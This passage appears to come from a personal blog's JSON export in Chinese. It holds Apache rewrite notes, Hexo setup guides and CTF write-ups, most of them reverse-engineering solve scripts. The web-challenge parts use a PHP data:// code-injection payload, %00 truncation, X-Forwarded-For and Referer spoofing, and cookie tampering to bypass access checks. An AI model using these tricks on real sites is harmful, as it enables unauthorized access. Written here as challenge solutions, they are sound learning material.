/404.php?url=$1 [L] 域名跳转123RewriteEngine onRewriteCond %&#123;HTTP_HOST&#125; ^en.smilejay.com [NC]RewriteRule ^(.*) http://www.smilejay.com/ [L] 配置多用户虚拟服务器12345678910111213ServerAdmin webmaster@kiya.usDocumentRoot /home/www/www.kiya.usServerName dns.kiya.usServerAlias dns.kiya.us kiya.us *.kiya.usCustomLog /var/log/httpd/osa/access_log.log” commonErrorLog /var/log/httpd/osa/error_log.log”AllowOverride NoneOrder deny,allowRewriteEngine onRewriteCond %&#123;HTTP_HOST&#125; ^[^.]+.kiya.(cn|us)$RewriteRule ^(.+) %&#123;HTTP_HOST&#125;$1 [C]RewriteRule ^([^.]+).kiya.(cn|us)(.*)$ /home/www/www.kiya.us/sylvan$3?un=$1&amp;%&#123;QUERY_STRING&#125; [L] 通过 Rewrite 防止盗链1234RewriteEngine OnRewriteCond %&#123;HTTP_REFERER&#125; chinaz.com [NC]RewriteCond %&#123;HTTP_REFERER&#125; im286.com [NC]RewriteRule .*\\.(jpg|jpeg|gif|png|rar|zip|txt|ace|torrent|gz|swf)$ http://www.xxx.com/fuck.png [R,NC,L] 屏蔽 IE 和 Opera 浏览器1234RewriteEngine onRewriteCond %&#123;HTTP_USER_AGENT&#125; ^MSIE [NC,OR]RewriteCond %&#123;HTTP_USER_AGENT&#125; ^Opera [NC]RewriteRule ^.* – [F,L] #这里&quot;-&quot;表示没有替换，浏览器为IE和Opera的访客将被禁止访问。 自动添加.php 扩展名及自动换.html 到.php 扩展名1234567RewriteEngine OnRewriteBase /testRewriteCond %&#123;REQUEST_FILENAME&#125;.php -fRewriteRule ([^/]+)$ /test/$1.php#for example: /test/admin =&gt; /test/admin.phpRewriteRule ([^/]+)\\.html$ /test/$1.php [L]#for example: /test/admin.html =&gt; /test/admin.php 限制仅显示图片123456#限制目录只能显示图片&lt; IfModule mod_rewrite.c&gt;RewriteEngine onRewriteCond %&#123;REQUEST_FILENAME&#125; !^.*\\.(gif|jpg|jpeg|png|swf)$RewriteRule .*$ – [F,L]&lt; /IfModule&gt; 隐藏 index.php12345678910Options +FollowSymLinksIndexIgnore */*RewriteEngine on# if a directory or a file exists, use it directlyRewriteCond %&#123;REQUEST_FILENAME&#125; !-fRewriteCond %&#123;REQUEST_FILENAME&#125; !-d# otherwise forward it to index.phpRewriteRule . index.php 1234RewriteEngine OnRewriteCond %&#123;REQUEST_FILENAME&#125; !-fRewriteCond %&#123;REQUEST_FILENAME&#125; !-dRewriteRule ^(.*)$ index.php/$1 [L] 参考网站：http://www.111cn.net/phper/apache/45642.htmhttp://smilejay.com/2012/10/apache-rewrite/https://www.cnblogs.com/zhenghongxin/p/6798310.htmlhttps://phperzh.com/articles/2922https://zybuluo.com/phper/note/73726","categories":[],"tags":[{"name":"note","slug":"note","permalink":"qianfei11.coding.me/tags/note/"},{"name":"web","slug":"web","permalink":"qianfei11.coding.me/tags/web/"}]},{"title":"2018-ZJGSUCTF","slug":"2018-ZJGSUCTF","date":"2018-05-07T04:06:41.000Z","updated":"2019-08-26T01:15:30.357Z","comments":true,"path":"2018/05/07/2018-ZJGSUCTF/","link":"","permalink":"qianfei11.coding.me/2018/05/07/2018-ZJGSUCTF/","excerpt":"第一次连续肝了两天的比赛，真正感受到了比赛的氛围，还有被大佬带飞的感觉，记录一下简单的几道题。","text":"第一次连续肝了两天的比赛，真正感受到了比赛的氛围，还有被大佬带飞的感觉，记录一下简单的几道题。 WEB奇淫技巧第一关，md5 碰撞。 第二关，数组绕过。 第三关，%00 截断。 第四关，PHP 伪协议data:text/plain,&lt;?php phpinfo()?&gt;。（附上大佬博客） 送分的点击flag in here后，跳转到另一个网站，提示为非法源无法访问。 想到X-Forwarded-For和Referer，经过尝试得到 flag。 给你的小世界打开网站先欣赏一遍精彩的小故事，然后查看源码，得到提示。 第一段字母显然是 base64，然后根据解码后得到的提示分别 base32、base16 解密得到 flag。 RERE 这块主要是复现。 签到题发现题目打不开，原来是文本文件，有一段 C 代码和汇编组成。 可以判断下面的汇编代码就是函数ck1()的汇编形式。具体操作也很容易看出： 12345678910111213.text:0040104A loc_40104A: ; CODE XREF: ck1+1F↑j.text:0040104A mov ecx, [ebp+var_4].text:0040104D cmp ecx, [ebp+arg_4].text:00401050 jge short loc_40106B.text:00401052 mov edx, [ebp+arg_0].text:00401055 add edx, [ebp+var_4].text:00401058 movsx eax, byte ptr [edx].text:0040105B xor eax, 30h.text:0040105E add eax, 1.text:00401061 mov ecx, [ebp+arg_0].text:00401064 add ecx, [ebp+var_4].text:00401067 mov [ecx], al.text:00401069 jmp short loc_401041 可以看到就是把enc字符串中的每个字符分别和0x30异或后再加一。 加密脚本（实际上就是填充函数ck1()的内容）如下： 1234567891011#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main() &#123; char enc[37]=\"\\x55\\x5b\\x50\\x56\\x4a\\x66\\x54\\x5b\\x52\\x5e\\x5c\\x54\\x6e\\x43\\x1f\\x6e\\x41\\x54\\x6e\\x43\\x57\\x58\\x42\\x6e\\x58\\x42\\x6e\\x5e\\x5d\\x5b\\x48\\x6e\\x50\\x42\\x5c\\x4c\"; for(int i = 0; i &lt; strlen(enc); i++) &#123; enc[i] ^= 0x30; enc[i] += 1; &#125; printf(\"%s\\n\",enc); return 0;&#125; babyre这题涉及到 ida 的一个小技巧 patch，通过看雪上的一篇文章了解了一下。f5 发现不行，显示栈不平衡，需要 patch。 先根据提示找到出错的位置。在 option 中勾选显示栈指针。然后再找到距离ret最近的call，然后修改栈指针的值。 成功 f5 后审计代码： 1234567891011121314151617181920212223242526272829303132333435int __cdecl main(int argc, const char **argv, const char **envp)&#123; const char *enc1; // esi signed int v4; // eax int v5; // esi char sbox; // [esp+Ch] [ebp-238h] char Dst; // [esp+Dh] [ebp-237h] char key; // [esp+10Ch] [ebp-138h] char v10; // [esp+12Eh] [ebp-116h] char input[52]; // [esp+20Ch] [ebp-38h] sbox = 0; memset(&amp;Dst, 0, 0xFFu); strcpy(&amp;key, \"flag&#123;this_is_not_the_flag_hahaha&#125;\"); memset(&amp;v10, 0, 0xDEu); printf(\"input flag:\\n\"); scanf(\"%50s\", input); if ( strlen(input) == 33 ) &#123; enc1 = base64encypt(input); rc4_init(&amp;sbox, (int)&amp;key, strlen(&amp;key)); rc4_crypto((int)&amp;sbox, (int)enc1, strlen(enc1)); v4 = 0; v5 = enc1 - flag; do &#123; if ( flag[v5 + v4] != flag[v4] ) exit(0); ++v4; &#125; while ( v4 &lt; 44 ); printf(\"Congratulation!!!!!!\\n\"); &#125; return 0;&#125; 经过对代码的审计，判断出先对输入字符串进行了 base64 加密，然后再通过 rc4 加密。在内存中分别找到 base64 的表以及被加密的 flag。 用 python2 中的pycrypto（使用方法：from Crypto.Cipher）进行 rc4 的加解密；用base64库进行 base64 加解密。脚本如下： 123456789101112131415161718from Crypto.Cipher import ARC4import base64import stringprint '-----------------ARC4-----------------'key = 'flag&#123;this_is_not_the_flag_hahaha&#125;'flag = '\\x20\\xC3\\x1A\\xAE\\x97\\x3C\\x7A\\x41\\xDE\\xF6\\x78\\x15\\xCB\\x4B\\x4C\\xDC\\x26\\x55\\x8B\\x55\\xE5\\xE9\\x55\\x75\\x40\\x3D\\x82\\x13\\xA5\\x60\\x13\\x3B\\xF5\\xD8\\x19\\x0E\\x47\\xCF\\x5F\\x5E\\xDE\\x9D\\x14\\xBD'enc1 = ARC4.new(key).decrypt(flag)print enc1print '----------------base64----------------'replaced = ''Base64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'table = 'ABCDEFGHIJSTUVWKLMNOPQRXYZabcdqrstuvwxefghijklmnopyz0123456789+/'for ch in enc1: if ch in Base64: replaced += Base64[string.find(table, str(ch))] elif ch == '=': replaced += '='print base64.b64decode(replaced) New driver拖进 OD 一运行就退出了。拖进 ida 发现有 tls 反调试： 用 PEview 查看 exe 中相关 PE 结构，然后在 010editor 中将对应部分的 value 清零： 除去 tls 后查壳发现有 upx。脱去后放进 ida： 123456789101112131415161718int main_0()&#123; HANDLE thread_2; // [esp+D0h] [ebp-14h] HANDLE thread_1; // [esp+DCh] [ebp-8h] j_read_input(); hObject = CreateMutexW(0, 0, 0); j_strcpy(Dest, Source); thread_1 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)one, 0, 0, 0); thread_2 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)two, 0, 0, 0); CloseHandle(thread_1); CloseHandle(thread_2); while ( dword_418008 != -1 ) ; j_print_dest(); CloseHandle(hObject); return 0;&#125; 一开始读取输入字符串，中间创建了两个线程，然后最后与被加密的 flag 进行比较以及输出 flag。回去看两个线程发现第二个线程没干什么事，主要是第一个线程进行了加密。其中加密函数的 sp 指针不平衡，需要修改指针值。修改后，进入函数： 1234567891011121314151617181920char **__cdecl encrypt(char *input, int index)&#123; char **result; // eax char v3; // [esp+D3h] [ebp-5h] v3 = input[index]; if ( (v3 &lt; 'a' || v3 &gt; 'z') &amp;&amp; (v3 &lt; 'A' || v3 &gt; 'Z') ) exit(0); if ( v3 &lt; 'a' || v3 &gt; 'z' ) // lower case &#123; result = (char **)table; input[index] = table[input[index] - 38]; &#125; else // upper case &#123; result = (char **)table; input[index] = table[input[index] - 96]; &#125; return result;&#125; 对每个字符大小写进行了判断，然后减法操作。还有一点是两个线程每次循环分别都 sleep 了 100s，那么依次循环就会造成奇偶依次加密。solve 脚本： 12345678910111213table = 'QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm'enc = [0x54, 0x4F, 0x69, 0x5A, 0x69, 0x5A, 0x74, 0x4F, 0x72, 0x59, 0x61, 0x54, 0x6F, 0x55, 0x77, 0x50, 0x6E, 0x54, 0x6F, 0x42, 0x73, 0x4F, 0x61, 0x4F, 0x61, 0x70, 0x73, 0x79, 0x53, 0x79]flag = ''for i in range(len(enc)): if i % 2 == 0: flag += chr(enc[i]) else: idx = table.index(chr(enc[i])) if idx &gt; 26: # lower case flag += chr(idx + 38) else: # upper case flag += chr(idx + 96)print 'flag:', flag Old driver32 位 exe 文件，拖进 ida 后，除了判断了字串长度为 40 和前后缀的 check，还发现函数被加密了： 12345678910111213141516171819202122232425262728293031323334353637int __cdecl main(int argc, const char **argv, const char **envp)&#123; int i; // ecx signed int j; // eax char input[39]; // [esp+0h] [ebp-40h] char v7; // [esp+27h] [ebp-19h] int v8; // [esp+34h] [ebp-Ch] __int16 v9; // [esp+38h] [ebp-8h] char v10; // [esp+3Ah] [ebp-6h] input[0] = 0; memset(&amp;input[1], 0, 0x31u); printf(\"input flag:\\n\"); scanf(\"%50s\", input); if ( strlen(input) == 40 ) &#123; for ( i = 0; i &lt; (char *)nullsub_1 - (char *)dword_401000; ++i ) *((_BYTE *)dword_401000 + i) ^= 0xBBu; v9 = 32123; v8 = 1734437990; v10 = 0; j = 0; do &#123; if ( input[j] != *((_BYTE *)&amp;v8 + j) ) goto LABEL_8; ++j; &#125; while ( j &lt; 5 ); LOBYTE(i) = v7; if ( v7 != *((_BYTE *)&amp;v8 + j) )LABEL_8: exit(0); ((void (__fastcall *)(int, char *))loc_4010B0)(i, input); &#125; return 0;&#125; 可以用 IDAPython 来 patch 一下： 123456from ida_bytes import *start_addr = 0x00401000end_addr = 0x00401260for i in range(start_addr, end_addr, 4): tmp = get_bytes(i, 1) patch_bytes(i, chr(ord(tmp) ^ 0xbb)) 或者用 Ollydbg 把解密过后的程序 dump 出来。找到加密过后的位置设下断点，断下来之后 dump 即可（注意前面还需要过一个长度的 check）： 把 dump 出来的程序拖进 ida： 12345678910111213141516171819202122232425262728293031323334353637int __cdecl main(int argc, const char **argv, const char **envp)&#123; int i; // ecx signed int j; // eax char input[39]; // [esp+0h] [ebp-40h] char v7; // [esp+27h] [ebp-19h] int v8; // [esp+34h] [ebp-Ch] __int16 v9; // [esp+38h] [ebp-8h] char v10; // [esp+3Ah] [ebp-6h] input[0] = 0; memset(&amp;input[1], 0, 0x31u); printf(\"input flag:\\n\"); scanf(\"%50s\", input); if ( strlen(input) == 40 ) &#123; for ( i = 0; i &lt; (char *)nullsub_1 - (char *)maze_solve; ++i ) *((_BYTE *)maze_solve + i) ^= 0xBBu; v9 = '&#125;&#123;'; v8 = 'galf'; v10 = 0; j = 0; do &#123; if ( input[j] != *((_BYTE *)&amp;v8 + j) ) goto LABEL_8; ++j; &#125; while ( j &lt; 5 ); LOBYTE(i) = v7; if ( v7 != *((_BYTE *)&amp;v8 + j) )LABEL_8: exit(0); base64(i, input); &#125; return 0;&#125; 进入加密函数后，先是对六位异或，然后 base64 几位字符，最后走个 maze。solve 脚本： 123456789101112131415161718192021import base64flag = 'flag&#123;'enc1 = [0xF2, 0xEE, 0xEF, 0xF5, 0xD9, 0xEF]for i in range(len(enc1)): flag += chr(enc1[i] ^ 0x86)enc2 = 'z91c'[::-1] + 'fNWb'[::-1]flag += base64.b64decode(enc2)# maze# --------# g + +# + + ++ +# + + #+ +# + ++++ +# + ++++ +# + +# --------# 'a'-down '2'-up 'q'-left 'w'-rightpath = 'waaaaawwwww22222qqaaw'flag += pathflag += '&#125;'print 'flag:', flag 秋名山车神12$ file re5re5: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=1c630722da16df2163ff83ea21cce93bf6b71a87, not stripped 32 位 elf 拖进 ida 查看： 123456789101112131415161718192021222324252627282930313233343536373839404142int __cdecl main(int argc, const char **argv, const char **envp)&#123; char v4; // [esp+0h] [ebp-2F0h] char m_t; // [esp+80h] [ebp-270h] char matrix; // [esp+180h] [ebp-170h] char input; // [esp+282h] [ebp-6Eh] int pipes[2]; // [esp+2C8h] [ebp-28h] __pid_t pid; // [esp+2D0h] [ebp-20h] size_t length; // [esp+2D4h] [ebp-1Ch] int *v11; // [esp+2E4h] [ebp-Ch] v11 = &amp;argc; length = 0; memset(&amp;v4, 0, 0x80u); puts(\"input flag:\"); __isoc99_scanf(); length = strlen(&amp;input); if ( length != 64 ) return 0; if ( pipe(pipes) &lt; 0 ) exit(1); pid = fork(); if ( pid &lt; 0 ) exit(1); if ( pid &lt;= 0 ) // children process &#123; close(pipes[1]); read(pipes[0], &amp;input, length); ck2((char **)&amp;matrix, &amp;input); ck3((char **)key_matrix, (char **)&amp;matrix, (int)&amp;m_t, 8, 8, 8); if ( ck4((int)&amp;m_t) ) printf(\"Congratulate!!!\"); &#125; else // father process &#123; close(pipes[0]); ck1(&amp;input, length); write(pipes[1], &amp;input, length); wait(0); &#125; return 0;&#125; main 函数中主要是先读取一个字符串，如果长度不为 64 则退出。之后 fork 了一个子进程，然后新建一个 pipe，在父进程把字符串输入 pipe，经过ck1()之后送到 pipe 里；子进程从 pipe 读取字符串，经过ck2()和ck3()后，在ck4()里判断。下面一个个分析。 ck1()是 rot13 加密： 12345678910111213141516171819202122232425262728293031int __cdecl ck1(char *input, int length)&#123; int result; // eax char v3; // [esp+Bh] [ebp-5h] int i; // [esp+Ch] [ebp-4h] for ( i = 0; ; ++i ) &#123; result = i; if ( i &gt;= length ) break; v3 = input[i] + 13; if ( input[i] &lt;= 96 || input[i] &gt; 122 ) &#123; if ( input[i] &lt;= 64 || input[i] &gt; 90 ) &#123; v3 = input[i]; &#125; else if ( (unsigned __int8)v3 &gt; 0x5Au ) &#123; v3 = input[i] - 13; &#125; &#125; else if ( (unsigned __int8)v3 &gt; 0x7Au ) &#123; v3 = input[i] - 13; &#125; input[i] = v3; &#125; return result;&#125; ck2()这里把输入的字符串转化成 8x8 的矩阵： 123456789101112131415161718192021222324signed int __cdecl ck2(char **m, char *input)&#123; signed int result; // eax int v3; // eax char *v4; // edx int v5; // [esp+4h] [ebp-Ch] signed int i; // [esp+8h] [ebp-8h] signed int j; // [esp+Ch] [ebp-4h] result = 134520832; v5 = 0; for ( i = 0; i &lt;= 7; ++i ) &#123; for ( j = 0; j &lt;= 7; ++j ) &#123; v3 = v5; v5 += (int)&amp;(&amp;GLOBAL_OFFSET_TABLE_)[4290763520] + 1; v4 = (char *)input[v3]; result = j; (&amp;m[8 * i])[j] = v4; &#125; &#125; return result;&#125; ck3()将输入的矩阵与一个 global 的矩阵key相乘： 123456789101112131415161718192021222324252627int __cdecl ck3(char **key, char **input, char **a3, int a4_8, int a5_8, int a6_8)&#123; int result; // eax int m; // [esp+4h] [ebp-10h] int i; // [esp+8h] [ebp-Ch] int k; // [esp+8h] [ebp-Ch] int j; // [esp+Ch] [ebp-8h] int l; // [esp+Ch] [ebp-8h] for ( i = 0; i &lt; a5_8; ++i ) &#123; for ( j = 0; j &lt; a4_8; ++j ) (&amp;a3[8 * i])[j] = 0; &#125; for ( k = 0; ; ++k ) &#123; result = k; if ( k &gt;= a5_8 ) break; for ( l = 0; l &lt; a4_8; ++l ) &#123; for ( m = 0; m &lt; a6_8; ++m ) (&amp;a3[8 * k])[l] = &amp;(&amp;a3[8 * k])[l][(_DWORD)(&amp;key[8 * k])[m] * (_DWORD)(&amp;input[8 * m])[l]]; &#125; &#125; return result;&#125; 最后的ck4()将输出的矩阵与 global 的enc_flag进行比较： 123456789101112131415signed int __cdecl ck4(char **m)&#123; signed int i; // [esp+8h] [ebp-Ch] signed int j; // [esp+Ch] [ebp-8h] for ( i = 0; i &lt;= 7; ++i ) &#123; for ( j = 0; j &lt;= 7; ++j ) &#123; if ( (&amp;m[8 * i])[j] != *(char **)&amp;enc_flag[4 * (8 * i + j)] ) return 0; &#125; &#125; return 1;&#125; 主要用 numpy，可以比较方便地实现矩阵间的运算。脚本如下： 1234567891011121314151617181920212223242526272829303132333435import numpy as npkey = [0x0000002B, 0x00000016, 0x0000001E, 0x00000053, 0x00000035, 0x00000039, 0x00000020, 0x00000029, 0x00000035, 0x00000063, 0x0000000A, 0x00000028, 0x0000002C, 0x00000006, 0x00000032, 0x0000002A, 0x00000055, 0x00000039, 0x00000014, 0x0000005F, 0x00000020, 0x00000019, 0x00000034, 0x00000021, 0x00000019, 0x0000000B, 0x0000005A, 0x00000009, 0x00000050, 0x00000034, 0x0000006F, 0x0000005C, 0x00000016, 0x0000001A, 0x00000068, 0x00000063, 0x00000034, 0x0000004E, 0x00000016, 0x00000045, 0x0000004C, 0x00000053, 0x0000002F, 0x0000003F, 0x0000003F, 0x00000028, 0x00000069, 0x00000051, 0x00000039, 0x00000044, 0x00000012, 0x00000024, 0x0000000A, 0x0000004D, 0x00000055, 0x00000031, 0x00000049, 0x0000003B, 0x00000040, 0x0000003B, 0x00000043, 0x00000028, 0x00000021, 0x00000036]enc = [0x00009A06, 0x0000879A, 0x00007DC4, 0x00008F1F, 0x000088AC, 0x0000850B, 0x0000785D, 0x0000822E, 0x00008FBC, 0x00007F69, 0x000081E5, 0x00008714, 0x00008572, 0x00008786, 0x00006A94, 0x000076FE, 0x0000A871, 0x00009A1E, 0x0000967E, 0x00009D97, 0x00009D4B, 0x00009AC6, 0x00007E38, 0x00008C62, 0x0000CD4A, 0x00009116, 0x0000A837, 0x0000A960, 0x0000A3A7, 0x00009B7E, 0x0000AC9C, 0x0000AB9E, 0x0000C94C, 0x0000AD7C, 0x0000A2C8, 0x0000BD86, 0x0000B1ED, 0x0000AD94, 0x0000A195, 0x0000AFE8, 0x0000ED71, 0x0000C239, 0x0000CD7E, 0x0000D459, 0x0000CEFF, 0x0000CBBC, 0x0000B972, 0x0000C36F, 0x0000A82A, 0x000089EF, 0x00008CBF, 0x00009AD1, 0x0000868F, 0x000086A6, 0x00007A26, 0x00007CD2, 0x0000C000, 0x0000A97A, 0x0000A470, 0x0000B3C8, 0x0000AFE5, 0x0000ABB9, 0x00008F7D, 0x0000A70A]key = np.mat(key).reshape(8, 8)enc = np.mat(enc).reshape(8, 8)# enc = key * out# out = key逆 * encout = key.I * encout = out.reshape(1, 64).tolist()[0]for i in range(len(out)): out[i] = int(round(out[i]))print outflag = ''for i in range(len(out)): flag += chr(out[i])print flagdef rot13(s): out = '' for ch in s: tmp = ord(ch) + 13 if ch.isupper(): if tmp &gt; 90: tmp -= 26 elif ch.islower(): if tmp &gt; 122: tmp -= 26 else: tmp = ord(ch) out += chr(tmp) return outflag = rot13(flag)print 'flag:', flag CRYPTO贝斯家族永不言败各种 base 解码。 壮壮可能是疯了…通过猪圈密码解开第一步。 MISC这是神魔鬼词频题，解码网站在这里。 表情包 10 块钱用 stegsolve 打开 gif 逐帧查看，快速看过 260+的图像后，收集到一张二维码的四片碎片，用美图秀秀拼接起来，再 XOR 一下，扫码得到 flag。 童年用金手指作弊通关魂斗罗得到 flag。 参考网站https://esebanana.github.io/2018/05/07/wp_2018_5_7_ZJGSUCTF/https://bbs.pediy.com/thread-158896.htmhttps://esebanana.github.io/2018/04/08/re_10_tls_smc/https://esebanana.github.io/2018/04/12/re_11_tou_ke/https://www.52pojie.cn/thread-593356-1-1.html","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"qianfei11.coding.me/tags/ctf/"},{"name":"wp","slug":"wp","permalink":"qianfei11.coding.me/tags/wp/"}]},{"title":"Mac下利用hexo和github搭建博客","slug":"Mac下利用hexo和github搭建博客","date":"2018-04-17T12:50:09.000Z","updated":"2019-08-26T05:52:51.110Z","comments":true,"path":"2018/04/17/Mac下利用hexo和github搭建博客/","link":"","permalink":"qianfei11.coding.me/2018/04/17/Mac下利用hexo和github搭建博客/","excerpt":"把双系统的 win10 删了，改用 mac。发现自己的博客忘记备份了，只好在 mac 上重新搭建一个。","text":"把双系统的 win10 删了，改用 mac。发现自己的博客忘记备份了，只好在 mac 上重新搭建一个。 安装流程： 1.hexo 是基于 nodejs 的，需安装 nodejs，安装 nodejs 最好选择 homebrew 2.首先查看电脑是否安装 ruby，因为 homebrew 安装依赖 ruby 3.安装顺序：homebrew-&gt;nodejs-&gt;hexo 安装 homebrew1ruby -e &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)&quot; 安装 nodejs1brew install node 安装 hexo12sudo npm install -g hexo# 可以加上 --registry=https://registry.npm.taobao.org 创建文件夹123mkdir blogcd bloghexo init 生成一套静态网页12hexo generatehexo server 在 localhost 的 4000 端口上就能看到本地搭建的博客 撰写博客1hexo new post &quot;balabala&quot; ‘balabala’即为博文的名字。 修改配置1234deploy: type: git repo: https://github.com/xxx/xxx.github.io branch: master 直接在_config.yml 中修改配置（xxx 为 github 的 name） 安装 hexo-deployer-git12npm install hexo-deployer-git --save# 可以加上 --registry=https://registry.npm.taobao.org 同步 github1hexo clean &amp;&amp; hexo generate &amp;&amp; hexo deploy 这样基础的搭建就完成啦！","categories":[],"tags":[{"name":"hexo","slug":"hexo","permalink":"qianfei11.coding.me/tags/hexo/"},{"name":"github","slug":"github","permalink":"qianfei11.coding.me/tags/github/"},{"name":"mac","slug":"mac","permalink":"qianfei11.coding.me/tags/mac/"}]},{"title":"解决复制文件时对于目标文件系统文件过大","slug":"解决复制文件时对于目标文件系统文件过大","date":"2018-02-26T09:00:34.000Z","updated":"2019-08-26T05:54:15.884Z","comments":true,"path":"2018/02/26/解决复制文件时对于目标文件系统文件过大/","link":"","permalink":"qianfei11.coding.me/2018/02/26/解决复制文件时对于目标文件系统文件过大/","excerpt":"今天在复制一个文件到 U 盘的时候，突然弹出了‘对于目标文件系统过大’的对话框，一个 4G 多的文件就这样不能够被复制到目标目录下了。","text":"今天在复制一个文件到 U 盘的时候，突然弹出了‘对于目标文件系统过大’的对话框，一个 4G 多的文件就这样不能够被复制到目标目录下了。 其实这是目标硬盘的格式不正确的原因，我这个 U 盘格式是 FAT32，应该将其修改成 NTFS 格式就可以了。 修改方法：在 cmd 中输入convert M:/fs:ntfs，其中‘M’是所在的磁盘，按回车键。 格式转换完成，再次复制文件，即可成功！","categories":[],"tags":[{"name":"solution","slug":"solution","permalink":"qianfei11.coding.me/tags/solution/"}]},{"title":"网络安全实验室-基础关","slug":"网络安全实验室-基础关","date":"2017-11-19T12:51:38.000Z","updated":"2019-04-29T10:18:59.000Z","comments":true,"path":"2017/11/19/网络安全实验室-基础关/","link":"","permalink":"qianfei11.coding.me/2017/11/19/网络安全实验室-基础关/","excerpt":"第一次写wp，主要是一些web题。","text":"第一次写wp，主要是一些web题。 第一题key在哪里？分值: 100过关地址 第二题再加密一次你就得到key啦~分值: 150加密之后的数据为xrlvf23xfqwsxsqf 第三题猜猜这是经过了多少次加密？分值: 200加密后的字符串为:  base64解码，python引用base64库写脚本(共经过了20次解码) 12345678import base64s = input()try: while True: s = base64.decodestring(s)except Exception: print s 第四题据说MD5加密很安全，真的是么？分值: 200e0960851294d7b2253978ba858e24633 第五题种族歧视分值: 300小明同学今天访问了一个网站，竟然不允许中国人访问！太坑了，于是小明同学决心一定要进去一探究竟！通关地址 第六题HAHA浏览器分值: 200据说信息安全小组最近出了一款新的浏览器，叫HAHA浏览器，有些题目必须通过HAHA浏览器才能答对。小明同学坚决不要装HAHA浏览器，怕有后门，但是如何才能过这个需要安装HAHA浏览器才能过的题目呢？通关地址 第七题key究竟在哪里呢？分值: 200上一次小明同学轻松找到了key，感觉这么简单的题目多无聊，于是有了找key的加强版，那么key这次会藏在哪里呢？通关地址 第八题key又找不到了分值: 350小明这次可真找不到key去哪里了，你能帮他找到key吗？通关地址 最初判断中间很快地跳过了一个页面。headers中发现原本应该转到key_is_here_now.php，但通过location转到了index_no_key.php，拼接url后找到key 第九题冒充登陆用户分值: 200小明来到一个网站，还是想要key，但是却怎么逗登陆不了，你能帮他登陆吗？通关地址 将headers中的login=0改为login=1就能得到key 第十题比较数字大小分值: 100只要比服务器上的数字大就可以了！通关地址 将网页源代码中的maxlength更改后重新打开网页输入大于999的数字得到key 第十一题本地的诱惑分值: 200小明扫描了他心爱的小红的电脑，发现开放了一个80端口，但是当小明去访问的时候却发现只允许从本地访问，可他心爱的小红不敢让这个诡异的小明触碰她的电脑，可小明真的想知道小红电脑的80端口到底隐藏着什么秘密(key)？通关地址 X-Forwarded-For简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项。它不是RFC中定义的标准请求头信息，在squid缓存代理服务器开发文档中可以找到该项的详细介绍。标准格式如下：X-Forwarded-For: client1, proxy1, proxy2。 在headers中添加X-Forwarded-For：127.0.0.1，然后就能在response里得到key。 第十二题就不让你访问分值: 150小明设计了一个网站，因为总是遭受黑客攻击后台，所以这次他把后台放到了一个无论是什么人都找不到的地方….可最后还是被黑客找到了，并被放置了一个黑页，写到:find you ,no more than 3 secs!通关地址 Robots协议（也称为爬虫协议、机器人协议等）全称是“网络爬虫排除标准”（Robots Exclusion Protocol），网站通过Robots协议告诉搜索引擎哪些页面可以抓取，哪些页面不能抓取。 通过爬虫协议发现有disallow的地方，就尝试进去。又发现有提示login page，就加上login.php，就能得到key了","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"qianfei11.coding.me/tags/ctf/"},{"name":"wp","slug":"wp","permalink":"qianfei11.coding.me/tags/wp/"}]},{"title":"Windows下利用hexo和github搭建博客","slug":"Windows下利用hexo和github搭建博客","date":"2017-11-18T14:12:54.000Z","updated":"2019-08-26T05:47:59.696Z","comments":true,"path":"2017/11/18/Windows下利用hexo和github搭建博客/","link":"","permalink":"qianfei11.coding.me/2017/11/18/Windows下利用hexo和github搭建博客/","excerpt":"记录下在 windows 下搭建博客的步骤。","text":"记录下在 windows 下搭建博客的步骤。 下载安装 gitgit 下载地址 下载安装 node.jsnode.js 下载地址 github 账号注册和新建仓库仓库名必须为“账户名.github.io”，勾选“Initialize this repository with a README” 安装 hexo通过命令行输入 12npm install hexo -g# 可以加上 --registry=https://registry.npm.taobao.org 注：-g 是指全局安装 hexo。 再输入 1hexo -v 检测是否安装成功 初始化 Hexo创建文件夹根据个人爱好在本地创建博客文件夹，用于保存博客的本地文件 初始化在 Hexo 文件下，右键运行 Git Bash，输入命令： 1hexo init 初始化成功后生成的一些列文件 再输入 12npm install# 可以加上 --registry=https://registry.npm.taobao.org 安装所需要的组件 配置在_config.yml，进行基础配置 本地浏览博客分别输入如下命令： 12hexo ghexo s 在浏览器输入：localhost:4000 ，就可以对本地的博客进行访问。 写文章在博客文件夹下输入 1hexo new post &quot;xxx&quot; 即能创建新博文，声称在_posts 文件夹下 或是在_posts 文件夹下，新建.md 文件就可以写文章 ssh 设置在博客文件夹下打开 git bash 后，分别输入 1git config --global user.name &quot;你的名字&quot; 和 1git config --global user.email &quot;你的邮箱&quot; 输入 1cd ~/.ssh 再输入 1ssh-keygen -t rsa -C &quot;你的邮箱&quot; 连续三个回车，生成密钥 再输入 1eval &quot;$(ssh-agent -s)&quot; 以添加密钥到 ssh-agent 再输入 1ssh-add ~/.ssh/id_rsa 添加生成的 SSH key 到 ssh-agent 然后登陆 github，点击头像下的 settings，添加一个新的 ssh，将 id_rsa.pub 文件里的内容复制上去 输入 1ssh -T git@github.com 如果出现“Hi 你的名字”，说明成功了 假如 ssh-key 配置失败首先，清除所有的 key-pair 12ssh-add -Drm -r ~/.ssh 删除你在 github 中的 public-key 重新生成 ssh 密钥对 1ssh-keygen -t rsa -C &quot;xxx@xxx.com&quot; 部署到 Github在_config.yml 进行配置deploy:type: gitrepository: https://github.com/你的名字/你的名字.github.iobranch: master 安装 hexo-deployer-git 自动部署发布工具12npm install hexo-deployer-git --save# 可以加上 --registry=https://registry.npm.taobao.org 发布到 Github输入如下命令： 1hexo clean &amp;&amp; hexo g &amp;&amp; hexo d 第一次发布需要验证 github 账号。 浏览器打开“你的名字.github.io”，就是你的博客了 